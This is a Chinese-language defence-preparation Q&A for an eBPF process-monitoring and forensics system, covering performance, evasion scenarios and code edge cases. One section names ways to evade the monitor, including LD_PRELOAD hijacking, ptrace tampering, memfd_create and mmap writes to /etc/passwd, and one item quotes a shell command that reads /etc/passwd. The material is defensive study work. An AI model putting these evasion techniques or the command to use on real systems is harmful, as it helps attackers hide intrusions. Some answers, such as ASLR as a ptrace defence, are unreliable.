**答案:** 取决于配置。测试：1. 使用压力测试工具；2. 模拟高并发场景；3. 监控性能指标；4. 优化瓶颈（数据库、网络、CPU）。

---

### 149. 你的数据库插入使用 ON CONFLICT 语句,这会造成性能问题吗?

**答案:** 会增加开销。优化：1. 使用内存缓存先去重；2. 批量插入；3. 减少冲突概率；4. 优化索引。

---

### 150. 你的 Agent 的 HTTP 请求没有复用连接,如何优化网络性能?

**答案:** 已有连接池（`http.Client`），但 `Timeout` 影响复用。优化：1. 增加连接池大小；2. 使用持久连接；3. 启用 HTTP/2；4. 使用连接复用。

---

### 151. 你的 Server 的 GetEvents 查询使用了多个可选参数,如何优化 SQL 查询?

**答案:** 优化：1. 使用预处理语句；2. 动态构建 SQL；3. 使用索引；4. 限制返回数量；5. 使用分页。

---

### 152. 你的风险评分算法使用了多次字符串比较,如何使用 Trie 或 Map 优化?

**答案:** 使用 Map：1. 预构建高频率程序 Map；2. O(1) 查询；3. 使用 Trie 匹配前缀；4. 减少比较次数。

---

### 153. 你的系统没有缓存机制,如何引入 Redis 缓存以提高性能?

**答案:** 引入 Redis：1. 缓存热点数据（统计信息）；2. 缓存事件指纹；3. 缓存取证报告；4. 设置过期时间；5. 缓存穿透保护。

---

### 154. 你的 Agent 和 Server 之间的通信没有压缩,如何启用压缩以减少网络带宽?

**答案:** 使用 gzip 压缩：1. 在 Agent 压缩 JSON；2. 在 Server 解压；3. 使用 HTTP 压缩（Accept-Encoding）；4. 选择压缩级别。

---

### 155. 你的数据库连接池设置为 25,如何根据负载动态调整?

**答案:** 实现动态连接池：1. 监控连接使用率；2. 根据负载调整大小；3. 实现连接池监控；4. 设置最小和最大连接数。

---

### 156. 你的 WebSocket 广播没有使用批处理,如何优化以提高吞吐量?

**答案:** 使用批处理：1. 收集一批事件；2. 批量发送；3. 使用二进制协议；4. 减少系统调用。

---

### 157. 你的系统没有使用批插入,如何优化数据库写入性能?

**答案:** 使用批插入：1. 收集一批事件；2. 使用事务插入；3. 减少网络往返；4. 优化 SQL 语句。

---

### 158. 你的风险评分算法在每次事件到达时都重新计算,如何使用缓存优化?

**答案:** 缓存评分结果：1. 缓存相同事件类型的评分；2. 使用 LRU Cache；3. 设置过期时间；4. 缓存命中率高时大幅提升性能。

---

### 159. 你的 Agent 从 ring buffer 读取事件后立即处理,如何引入队列以平滑处理峰值?

**答案:** 引入队列：1. 使用 channel 作为队列；2. 使用 worker pool 处理；3. 设置队列大小限制；4. 实现背压。

---

### 160. 你的 Server 的 GetEventStatistics 查询使用了多次数据库查询,如何优化为单次查询?

**答案:** 优化为单次查询：1. 使用 JOIN 聚合数据；2. 使用子查询；3. 使用窗口函数；4. 使用预计算表。

---

## 六、安全性和防御绕过问题 (20题)

### 161. 如果攻击者使用 LD_PRELOAD 劫持你的 Agent 的网络库,事件会被篡改吗?

**答案:** 会。建议：1. 使用静态编译；2. 使用 SUID bit；3. 验证 Agent 完整性；4. 使用签名验证。

---

### 162. 如果攻击者修改 /etc/passwd 文件但不使用 openat 系统调用,你的系统能检测到吗?

**答案:** 不能。建议：1. 监控文件系统事件（fanotify/inotify）；2. 定期验证文件完整性；3. 监控相关系统调用。

---

### 163. 如果攻击者使用 ptrace 修改你的 Server 的内存,风险评分会被篡改吗?

**答案:** 会。建议：1. 使用内存保护（ASLR）；2. 监控 ptrace 使用；3. 使用签名验证；4. 运行在安全环境。

---

### 164. 如果攻击者使用 iptables 阻断你的 Agent 到 Server 的网络连接,系统还能工作吗?

**答案:** 不能。建议：1. 实现本地持久化；2. 支持离线模式；3. 使用多种通信方式；4. 监控网络连接。

---

### 165. 如果攻击者使用 setuid(0) 但立即 setuid(original_uid),你的系统会记录吗?

**答案:** 会记录提权事件，但可能漏掉降权。建议：1. 监控完整的权限变更序列；2. 检测频繁的权限切换。

---

### 166. 如果攻击者使用 unshare 创建新的命名空间,你的网络监控还能工作吗?

**答案:** 可能不准确。建议：1. 记录命名空间信息；2. 映射命名空间到物理地址；3. 分析命名空间上下文。

---

### 167. 如果攻击者使用 mmap 修改 /etc/passwd 文件,而不使用 write 系统调用,你的系统能检测到吗?

**答案:** 不能。建议：1. 监控 mmap 系统调用；2. 监控文件修改；3. 定期验证文件完整性。

---

### 168. 如果攻击者使用 execve 执行 /bin/sh -c "cat /etc/passwd",你的系统会记录吗?

**答案:** 会记录 execve 和 openat 事件。建议：1. 分析命令行参数；2. 关联父子进程；3. 检测命令注入。

---

### 169. 如果攻击者使用 socketpair 而不是 connect 建立网络连接,你的系统能检测到吗?

**答案:** 不能。建议：1. 监控 socketpair 系统调用；2. 监控 Unix Domain Socket；3. 分析进程间通信。

---

### 170. 如果攻击者使用 LD_LIBRARY_PATH 劫持你的 Agent 的 eBPF 库,你的 Agent 还能加载 eBPF 程序吗?

**答案:** 可能加载恶意库。建议：1. 使用静态编译；2. 验证库完整性；3. 使用可信路径；4. 使用 SUID bit。

---

### 171. 如果攻击者使用 chroot 改变根目录,你的文件路径监控还能工作吗?

**答案:** 可能失效。建议：1. 记录原始根目录；2. 监控 chroot 系统调用；3. 解析真实路径。

---

### 172. 如果攻击者使用 mount --bind 隐藏恶意文件,你的文件路径监控还能检测到吗?

**答案:** 部分检测。建议：1. 监控 mount 系统调用；2. 验证文件系统一致性；3. 使用设备 ID 追踪。

---

### 173. 如果攻击者使用 rename 系统调用移动敏感文件,你的系统能检测到吗?

**答案:** 不能。建议：1. 监控 rename 系统调用；2. 监控文件移动；3. 追踪文件 inode。

---

### 174. 如果攻击者使用 unlink 删除敏感文件,你的系统能检测到吗?

**答案:** 不能。建议：1. 监控 unlink 系统调用；2. 监控文件删除；3. 定期验证文件存在性。

---

### 175. 如果攻击者使用 chmod 修改文件权限,你的系统能检测到吗?

**答案:** 不能。建议：1. 监控 chmod 系统调用；2. 监控权限变更；3. 定期验证文件权限。

---

### 176. 如果攻击者使用 chown 修改文件所有者,你的系统能检测到吗?

**答案:** 不能。建议：1. 监控 chown 系统调用；2. 监控所有者变更；3. 定期验证文件所有者。

---

### 177. 如果攻击者使用 symlink 创建符号链接指向敏感文件,你的系统能检测到吗?

**答案:** 部分检测。建议：1. 解析符号链接；2. 监控 symlink 系统调用；3. 追踪真实路径。

---

### 178. 如果攻击者使用 mkfifo 创建命名管道进行进程间通信,你的系统能检测到吗?

**答案:** 不能。建议：1. 监控 mkfifo 系统调用；2. 监控 IPC 机制；3. 分析进程通信模式。

---

### 179. 如果攻击者使用 memfd_create 创建内存文件,而不使用磁盘文件,你的系统能检测到吗?

**答案:** 不能。建议：1. 监控 memfd_create 系统调用；2. 监控内存文件；3. 分析内存访问模式。

---

### 180. 如果攻击者使用 userfaultfd 机制绕过你的监控,你的系统还能检测到吗?

**答案:** 可能失效。建议：1. 监控 userfaultfd 系统调用；2. 监控内存缺页处理；3. 分析异常内存操作。

---

## 七、代码实现细节和边界情况 (20题)

### 181. 你的 getBootTime() 函数从 /proc/stat 读取,如果 /proc 没有挂载怎么办?

**答案:** 会失败。建议：1. 检查 /proc 是否存在；2. 使用备选方法（如 `CLOCK_BOOTTIME`）；3. 提供默认值；4. 记录错误日志。

---

### 182. 你的 Agent 的 sendEventToServer 函数在 defer 中释放信号量,但如果 goroutine panic 会释放吗?

**答案:** 会。defer 在 panic 时也会执行。但建议：1. 检查 panic；2. 使用 recover；3. 确保资源正确释放。

---

### 183. 你的 Server 的 handleEvents 函数使用 json.NewDecoder 解析请求,如果请求体格式错误会返回什么错误?

**答案:** 返回 `400 Bad Request`。建议：1. 记录详细错误；2. 返回错误信息；3. 验证请求格式。

---

### 184. 你的 isHighRiskProgram 函数使用 strings.ToLower 比较,如果进程名包含非 ASCII 字符怎么办?

**答案:** 可能错误匹配。建议：1. 使用 UTF-8 处理；2. 规范化字符串；3. 使用 Unicode 比较。

---

### 185. 你的 Agent 的 sendEventToServer 函数过滤 localhost:8080 的连接,但 IPv6 的 ::1 怎么办?

**答案:** 无法过滤。建议：1. 支持 IPv6 地址；2. 解析所有 localhost 形式；3. 使用地址族判断。

---

### 186. 你的 Server 的 handleTimelineReconstruction 函数使用 pid 参数,但 pid 可能是 0 吗?

**答案:** 可能为 0（读取失败时）。建议：1. 验证 PID 范围；2. 返回错误；3. 处理特殊情况。

---

### 187. 你的 Agent 的 getBootTime() 函数如果失败会返回 time.Time{},这会影响时间戳转换吗?

**答案:** 会。`time.Time{}` 是零值，会导致时间戳错误。建议：1. 返回 error；2. 使用默认值；3. 记录错误。

---

### 188. 你的 isReverseShell 函数使用 strings.HasPrefix 检测,如果进程名是 bash-script 会误报吗?

**答案:** 会。建议：1. 使用精确匹配；2. 使用词边界；3. 使用正则表达式。

---

### 189. 你的 Server 的 handleEvents 函数在去重检查时查询数据库,如果数据库返回错误会怎么办?

**答案:** 继续插入，可能导致重复。建议：1. 处理数据库错误；2. 记录错误日志；3. 使用重试机制。

---

### 190. 你的 Agent 的 sendEventToServer 函数使用 http.Client 的默认超时,如果 Server 响应慢会超时吗?

**答案:** 会，已配置 10 秒超时。建议：1. 动态调整超时；2. 使用 context 控制；3. 监控响应时间。

---

### 191. 你的 isUnusualPort 函数使用 map 存储端口,但如果端口数很多会影响性能吗?

**答案:** Map 查询 O(1)，性能好。但如果端口数很多（如 10000+），内存占用大。建议：1. 使用 Bloom Filter；2. 分层存储；3. 限制端口数量。

---

### 192. 你的 Server 的 handleWebSocket 函数发送初始事件时没有错误处理,如果发送失败会怎么办?

**答案:** 连接可能异常。建议：1. 处理发送错误；2. 关闭连接；3. 记录错误日志。

---

### 193. 你的 Agent 的 sendEventToServer 函数在发送失败时只打印日志,如果日志文件满了会怎么办?

**答案:** 日志写入失败。建议：1. 使用日志轮转；2. 监控日志大小；3. 使用 syslog；4. 设置日志级别。

---

### 194. 你的 isSensitivePath 函数使用 strings.Contains 检测,如果路径包含 /etc/backup/passwd 会误报吗?

**答案:** 会。建议：1. 使用路径前缀匹配；2. 解析完整路径；3. 使用正则表达式。

---

### 195. 你的 Server 的 handleGetEvents 函数使用 query.Get 获取参数,如果参数是字符串但期望是整数会怎么办?

**答案:** 解析失败，使用默认值。建议：1. 验证参数类型；2. 返回错误；3. 提供默认值。

---

### 196. 你的 Agent 的 sendEventToServer 函数过滤 agent 自己的事件,但如果进程名是 agent.sh 会误过滤吗?

**答案:** 会。建议：1. 使用精确匹配；2. 使用可执行文件路径；3. 使用 PID 过滤。

---

### 197. 你的 isSuspiciousTool 函数使用 strings.Contains 检测,如果进程名是 wget2 会误报吗?

**答案:** 会。建议：1. 使用精确匹配；2. 使用词边界；3. 使用正则表达式。

---

### 198. 你的 Server 的 handleEvents 函数使用 serverEvent 结构体,但如果 Comm 字段包含空字符会怎么办?

**答案:** 可能影响 JSON 解析。建议：1. 清理字符串；2. 验证输入；3. 处理特殊字符。

---

### 199. 你的 Agent 的 sendEventToServer 函数使用 bytes.Trim 去除空字符,但如果字符串全是空字符会怎么办?

**答案:** 返回空字符串。建议：1. 检查结果；2. 提供默认值；3. 记录警告。

---

### 200. 你的 isHighRiskProgram 函数使用 []string 存储程序名,如果列表很长会影响性能吗?如何优化?

**答案:** 线性搜索 O(n)，列表长会影响性能。优化：1. 使用 Map 或 Set（O(1) 查询）；2. 使用 Trie 树；3. 预编译正则表达式；4. 分层存储。

---

## 总结

本文档涵盖了 eBPF 进程监控与安全取证系统的 200 个技术问题，涵盖：

1. **eBPF 内核态实现** (1-40)
2. **Agent 和 Server 实现** (41-80)
3. **风险分析和评分算法** (81-110)
4. **系统架构和设计** (111-140)
5. **性能和优化** (141-160)
6. **安全性和防御绕过** (161-180)
7. **代码实现细节** (181-200)

**关键改进方向:**
- 扩展监控范围（IPv6、UDP、更多系统调用）
- 优化性能（批处理、缓存、连接池）
- 增强安全性（认证、加密、完整性验证）
- 改进架构（分布式、消息队列、配置化）
- 完善功能（进程树、告警、数据导出）

**答辩准备建议:**
- 重点掌握核心问题（1-10, 41-45, 81-90, 111-115）
- 准备代码示例和改进方案
- 理解系统架构和设计权衡
- 了解性能优化和安全加固方法

祝答辩顺利！